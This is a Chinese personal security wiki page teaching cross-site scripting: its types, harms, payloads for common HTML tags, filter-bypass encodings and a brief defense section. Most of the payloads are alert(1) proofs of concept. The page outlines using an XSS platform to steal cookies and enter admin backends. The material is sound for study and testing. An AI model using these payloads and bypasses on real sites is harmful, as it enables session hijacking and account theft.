<!DOCTYPE html>
<html lang="zh-cn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          WebSecurity-xss - 信息安全个人wiki&amp;blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 4.2.1"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>信息安全个人WIKI&amp;BLOG</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
<li><a href="/about">About</a></li>
<li><a href="/note">Notes</a></li>
</ul>
<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
<li><a href="/contents/xss">WebSecurity-xss</a></li>
<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
<li><a href="/contents/FI">WebSecurity-FI</a></li>
<li><a href="/contents/rce">WebSecurity-rce</a></li>
<li><a href="/contents/upload">WebSecurity-upload</a></li>
<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
</ul>
<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
</ul>
<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
</ul>
<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
<li><a href="/contents/login">登录框渗透总结</a></li>
<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
</ul>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
<li>待补充</li>
</ul>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
</ul>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
<li>待补充</li>
</ul>
<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
<li><a href="/contents/tools">一些工具的使用命令</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <p>仅以此文系统的学习一下xss漏洞，包括其原理，分类，绕过方式，防御方式<a id="more"></a> </p>
<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><h3 id="XSS是什么？"><a href="#XSS是什么？" class="headerlink" title="XSS是什么？"></a>XSS是什么？</h3><p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击。</p>
<p>简单来说xss就是插入了一段攻击者自定义的js代码</p>
<h3 id="XSS会造成那些危害？"><a href="#XSS会造成那些危害？" class="headerlink" title="XSS会造成那些危害？"></a>XSS会造成那些危害？</h3><p>js可以做到的一切 xss都可以做到</p>
<ul>
<li>网络钓鱼，包括获取各类用户账号；</li>
<li>窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；</li>
<li>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等；</li>
<li>强制弹出广告页面、刷流量等；</li>
<li>网页挂马；</li>
<li>进行恶意操作，如任意篡改页面信息、删除文章等；</li>
<li>进行大量的客户端攻击，如ddos等；</li>
<li>获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</li>
<li>控制受害者机器向其他网站发起攻击；</li>
<li>结合其他漏洞，如csrf,如ssrf实施进一步危害；</li>
<li>提升用户权限，包括进一步渗透网站；</li>
<li>传播跨站脚本蠕虫等</li>
<li>获得管理员页面的html源码btoa(document.body.innerHTML)</li>
</ul>
<p>只有当你挖到xss的洞看到几百个cookie的你才会感慨这个攻击的危害之大！！！</p>
<h3 id="XSS常见出现漏洞的地方"><a href="#XSS常见出现漏洞的地方" class="headerlink" title="XSS常见出现漏洞的地方"></a>XSS常见出现漏洞的地方</h3><ol>
<li>数据交互的地方<ul>
<li>get、post、cookies、headers</li>
<li>反馈与浏览</li>
<li>富文本编辑器</li>
<li>各类标签插入和自定义</li>
</ul>
</li>
<li>数据输出的地方<ul>
<li>用户资料</li>
<li>关键词、标签、说明</li>
<li>文件上传</li>
</ul>
</li>
</ol>
<p>总结来说很多地方都可能存在xss</p>
<p><strong>就src来说</strong></p>
<ol>
<li>反馈处存在xss盲打</li>
<li>发帖，评论处存在存储xss</li>
<li>隐藏参数的xss</li>
<li>返回页面的Conten-type如果是html 参数存在xss</li>
<li>上传html造成的xss</li>
<li>上传文件的文件名造成的xss</li>
<li>登录跳转处的xss</li>
<li>邮件提交处的xss</li>
<li>后缀直接改成html 可能存在一些文件直接以html解析</li>
<li>某些系统可能加载其他服务器下的文件，可将其改成其他服务器下的swg文件</li>
</ol>
<h3 id="xss攻击流程"><a href="#xss攻击流程" class="headerlink" title="xss攻击流程"></a>xss攻击流程</h3><p>发现存在xss的地方—-&gt;借助xss平台打cookie—-&gt;得到后台地址和cookie—-&gt;利用burp修改cookie进入后台</p>
<h2 id="0x02-XSS的分类"><a href="#0x02-XSS的分类" class="headerlink" title="0x02  XSS的分类"></a>0x02  XSS的分类</h2><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>又称非持久型XSS，这种攻击方式往往具有一次性，只在用户单击时触发。</p>
<p><strong>用户的请求直接输出到html页面中</strong></p>
<h3 id="Dom型xss"><a href="#Dom型xss" class="headerlink" title="Dom型xss"></a>Dom型xss</h3><p>由于这一块是个知识盲区，所以这里会着重写这一块</p>
<p>DOM(Document object model)，使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。</p>
<p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的，他比反射型XSS多了一层思考，需要我们考虑用户输出被JavaScript用来做了什么****</p>
<p>这里举几种XSS的利用案例</p>
<h4 id="innerHTML-output"><a href="#innerHTML-output" class="headerlink" title="innerHTML=[output]"></a>innerHTML=[output]</h4><p>首先我们创建一个这样的页面</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"a"</span>&gt;<span class="keyword">this</span> is the first output&lt;div&gt;</span><br><span class="line">&lt;script&gt; <span class="built_in">document</span>.getElementById(<span class="string">"a"</span>).innerHTML=<span class="string">"this is the second output"</span>;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">浏览器输出  this is the second output</span></span><br></pre></td></tr></table></figure>

<p>这里通过<code>getElementById</code>获取id的元素，通过<code>innerHTML</code>改变标签之间的<code>html</code></p>
<p>这种情况即可触发<code>dom  xss</code> 因为我们可以在output处插入我们的恶意js代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"a"</span>&gt;<span class="keyword">this</span> is the first output&lt;div&gt;</span><br><span class="line">&lt;script&gt; <span class="built_in">document</span>.getElementById(<span class="string">"a"</span>).innerHTML=<span class="string">"/aaa/get_cookie.js"</span>;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="js字符串的unicode编码"><a href="#js字符串的unicode编码" class="headerlink" title="js字符串的unicode编码"></a>js字符串的unicode编码</h5><p>这其中我们还可以把一些特殊字符转换成<code>unicode</code>编码，其触发效果也一样</p>
<p><code>&lt;&gt;</code>的两种unicode编码形式<code>\u003c\u003e</code>和<code>\x3c\x3e</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="built_in">document</span>.getElementById(<span class="string">"a"</span>).innerHTML=<span class="string">"\x3Cimg\u0020src=1\u0020onerror=alert(1)\u003e"</span>;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="charCodeAt"><a href="#charCodeAt" class="headerlink" title="charCodeAt"></a>charCodeAt</h5><p>使用js中的charCodeAt函数讲字符串转变成字符的ascii码，类似于ord函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;a&quot;&gt;this is the first output&lt;div&gt;</span><br><span class="line">&lt;script&gt; </span><br><span class="line">var str &#x3D; &quot;&lt;&gt;&quot;;</span><br><span class="line">document.getElementById(&quot;a&quot;).innerHTML&#x3D;(str.charCodeAt(0)); </span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">输出60</span><br><span class="line">document.getElementById(&quot;a&quot;).innerHTML&#x3D;(str.charCodeAt(1));</span><br><span class="line">输出62</span><br></pre></td></tr></table></figure>

<p><img src="/img/xss_1.png" alt=""></p>
<h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h5><p>使用字符串方法，将其转化成16进制，相当于chr函数之后再转16进制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">var str &#x3D; &quot;&lt;&gt;&quot;;</span><br><span class="line">str &#x3D; str.charCodeAt(0);</span><br><span class="line">document.getElementById(&quot;a&quot;).innerHTML&#x3D;(str.toString(16));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">输出 3c,剩下的两位用00补足，也就是\u003c,而这里前缀可以使用\x替换\u也可以实现。</span><br></pre></td></tr></table></figure>

<h5 id="document-write-output"><a href="#document-write-output" class="headerlink" title="document.write(output)"></a>document.write(output)</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"a"</span>&gt;<span class="keyword">this</span> is the first output&lt;div&gt;</span><br><span class="line">&lt;script&gt; </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"\x3Cimg\u0020src=1\u0020onerror=alert(1)\x3e"</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="隐式输出"><a href="#隐式输出" class="headerlink" title="隐式输出"></a>隐式输出</h4><p>隐式输出是指输出的结果我们看不见,也就是我们再右键源代码中找不到我们输入的内容。但是无论是隐式还是显式，最终都是要通过<code>innerhtml</code>或<code>document.write</code>输出。</p>
<h5 id="getParam-getUrlPara"><a href="#getParam-getUrlPara" class="headerlink" title="getParam / getUrlPara"></a>getParam / getUrlPara</h5><p>前端开发人员再获取地址栏的参数的时候，一般会自定义这样的函数，作用就是获取地址栏的参数，在显示处有可能这样构造代码,例如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;nick&quot;&gt;加载中...&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a&#x3D;getParam(&quot;name&quot;);</span><br><span class="line">document.getElementById(&quot;nick&quot;).innerHTML&#x3D;a;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>所以如果没有安全措施，就可能造成之前前面提到的innerHTML型xss。</p>
<h5 id="eval类型"><a href="#eval类型" class="headerlink" title="eval类型"></a>eval类型</h5><p>源代码与调试工具都看不到我们输入的东西，一般的操作手法是通过<code>console</code>查看，可以给参数输入一些特殊字符，因为一般不会报错。 查看报错信息可以定位到<code>js</code>的错误位置，例如如下错误代码:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getarg = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> url = <span class="built_in">window</span>.location.href; </span><br><span class="line">    <span class="keyword">var</span> allargs = url.split(<span class="string">"?"</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (allargs!=<span class="literal">null</span> &amp;&amp; allargs.indexOf(<span class="string">"="</span>)&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> args = allargs.split(<span class="string">"&amp;"</span>); </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;args.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> arg = args[i].split(<span class="string">"="</span>); </span><br><span class="line">            <span class="built_in">eval</span>(<span class="string">'this.'</span>+arg[<span class="number">0</span>]+<span class="string">'="'</span>+arg[<span class="number">1</span>]+<span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>同样的xss方式遇上面相同。eval用法 eval(alert(1))</p>
<h5 id="iframe类型"><a href="#iframe类型" class="headerlink" title="iframe类型"></a>iframe类型</h5><p> iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。</p>
<h6 id="onload"><a href="#onload" class="headerlink" title="onload"></a>onload</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">"alert(1)"</span>&gt;&lt;<span class="regexp">/iframe&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="src-执行js代码"><a href="#src-执行js代码" class="headerlink" title="src 执行js代码"></a>src 执行js代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript:alert(1)&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<p>tips：img中的src不会当作js解析。这里需要注意。也就是说<code>&lt;img src=&quot;xxx/test.js&quot;&gt;</code>是无法实现的。</p>
<h6 id="IE-src-执行vbscript代码"><a href="#IE-src-执行vbscript代码" class="headerlink" title="IE src 执行vbscript代码"></a>IE src 执行vbscript代码</h6><p>VBScript 是微软公司出品的脚本语言。所以只能在ie中执行，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"vbscript:msgbox(1)"</span>&gt;&lt;<span class="regexp">/iframe&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:,                            文本数据</span><br><span class="line">data:text/plain,                    文本数据</span><br><span class="line">data:text/html,                  HTML代码</span><br><span class="line">data:text/html;base64,            base64编码的HTML代码</span><br><span class="line">data:text/css,                    CSS代码</span><br><span class="line">data:text/css;base64,              base64编码的CSS代码</span><br><span class="line">data:text/javascript,              Javascript代码</span><br><span class="line">data:text/javascript;base64,        base64编码的Javascript代码</span><br><span class="line">data:image/gif;base64,            base64编码的gif图片数据</span><br><span class="line">data:image/png;base64,            base64编码的png图片数据</span><br><span class="line">data:image/jpeg;base64,          base64编码的jpeg图片数据</span><br><span class="line">data:image/x-icon;base64,          base64编码的icon图片数据</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;&lt;<span class="regexp">/iframe&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>又称持久型XSS，比反射型XSS更具有威胁性，并且可能影响到Web服务器自身的安全。攻击脚本将被永久的存放在目标服务器的数据库或文件中。</p>
<h2 id="0x03-常见标签"><a href="#0x03-常见标签" class="headerlink" title="0x03 常见标签"></a>0x03 常见标签</h2><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">"javascript:alert(1)"</span>&gt;</span><br><span class="line">&lt;img src=<span class="number">1</span> onmouseover=alert(<span class="string">'xss'</span>)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">herf</span><br><span class="line">&lt;a href=<span class="string">"javascript:alert('xss')"</span>&gt;test&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href=javascript:eval(alert('xss'))&gt;test&lt;/</span>a&gt;</span><br><span class="line">on</span><br><span class="line">&lt;a href=<span class="string">"javascript:aaa"</span> onmouseover=<span class="string">"alert(xss)"</span>&gt;test&lt;<span class="regexp">/a&gt; #鼠标经过</span></span><br><span class="line"><span class="regexp">&lt;a href="" onclick=alert('xss')&gt;test&lt;/</span>a&gt;</span><br><span class="line">&lt;a href=<span class="string">""</span> onclick=<span class="built_in">eval</span>(alert(<span class="string">'xss'</span>))&gt;test&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=<span class="string">""</span> onclick=alert(<span class="string">'xss'</span>) type=<span class="string">"text"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span> onmouseover=prompt(<span class="string">'xss'</span>) bad=<span class="string">""</span>&gt;</span><br><span class="line">一位大佬的accesskey利用</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> value=<span class="string">""</span> accesskey=<span class="string">"x"</span> onclick=<span class="string">"alert(1)"</span>&gt;</span><br><span class="line">触发的条件是在win/linux+Firefox，需要使用shift+alt+x</span><br></pre></td></tr></table></figure>

<h3 id="form标签"><a href="#form标签" class="headerlink" title="form标签"></a>form标签</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">action属性</span><br><span class="line">&lt;form action=javascript:alert(<span class="string">'xss'</span>) method=<span class="string">"get"</span>&gt;</span><br><span class="line">&lt;form action=javascript:alert(<span class="string">'xss'</span>)&gt; </span><br><span class="line">&lt;form method=post action=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;(data协议绕过)</span><br></pre></td></tr></table></figure>

<h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">src属性</span><br><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;(data协议绕过)</span><br><span class="line">on属性</span><br><span class="line">&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;</span><br></pre></td></tr></table></figure>

<h3 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data&#x3D;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4&#x3D;&gt;&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x04-bypass"><a href="#0x04-bypass" class="headerlink" title="0x04 bypass"></a>0x04 bypass</h2><p>安利一个链接<a href="https://www.toolmao.com/xsstranser" target="_blank" rel="noopener">https://www.toolmao.com/xsstranser</a></p>
<h5 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h5><p>jS提供了四种字符编码的策略</p>
<ul>
<li>三个八进制数字，如果数字不够，在前面补零，如<code>a</code>的编码为<code>\141</code></li>
<li>两个十六进制数字，如果数字不够，在前面补零，如<code>a</code>的编码为<code>\x61</code></li>
<li>四个十六进制数字，如果数字不够，在前面补零，如<code>a</code>的编码为<code>\u0061</code></li>
<li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\n</code>和<code>\r</code></li>
</ul>
<h5 id="html实体编码"><a href="#html实体编码" class="headerlink" title="html实体编码"></a>html实体编码</h5><p>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
<h5 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h5><p>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#数值;</code></p>
<p>如<code>&lt;</code>的编码为</p>
<p><code>&amp;#60;</code> (10进制)</p>
<p><code>&amp;#x003c;</code> (16进制)</p>
<h5 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h5><p>也就是两次url编码</p>
<p>如<code>alert</code>的url全编码为<code>%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>
<h5 id="String-fromCharCode编码"><a href="#String-fromCharCode编码" class="headerlink" title="String.fromCharCode编码"></a>String.fromCharCode编码</h5><p>如<code>alert</code>的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p>
<h5 id="拆分绕过黑名单"><a href="#拆分绕过黑名单" class="headerlink" title="拆分绕过黑名单"></a>拆分绕过黑名单</h5><p>settime:<br><code>&lt;svg/onload=setTimeout(&#39;ale&#39;+&#39;rt(1)&#39;,0)&gt;</code><br>location:<br><code>&lt;svg/onload =&quot;location=&#39;jav&#39;+&#39;ascript&#39;+&#39;:%2&#39;+&#39;0aler&#39;+&#39;t%20%2&#39;+&#39;81%&#39;+&#39;29&#39;&quot;&gt;</code></p>
<h5 id="一些绕过实例"><a href="#一些绕过实例" class="headerlink" title="一些绕过实例"></a>一些绕过实例</h5><p>绕过onerror:使用替代的函数</p>
<p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
<p>绕过Javascript</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">'javascri'</span><span class="attr">.concat</span>('<span class="attr">pt:aler</span>','<span class="attr">t</span>(<span class="attr">1</span>)')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span> =<span class="string">"location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'"</span>&gt;</span>`</span><br><span class="line"><span class="tag">&lt;<span class="name">a+href=j%26%23x0000061%3bv%2%23%61%3bscript:alert`1`</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a+href=j&amp;#x0000061;v&amp;#a;script:alert`1`</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过location: </p>
<h2 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h2><h5 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h5><ul>
<li>输入是否仅仅包含合法的字符</li>
<li>输入字符串是否超过最大长度的限制</li>
<li>输入如果为数字，数字是否在指定的范围内</li>
<li>输入是否符合特定的格式要求，如邮箱、电话号码、ip地址等</li>
</ul>
<h5 id="输出编码"><a href="#输出编码" class="headerlink" title="输出编码"></a>输出编码</h5><p>对输出到页面上的数据进行html编码，可以使危害的信息变成无害</p>
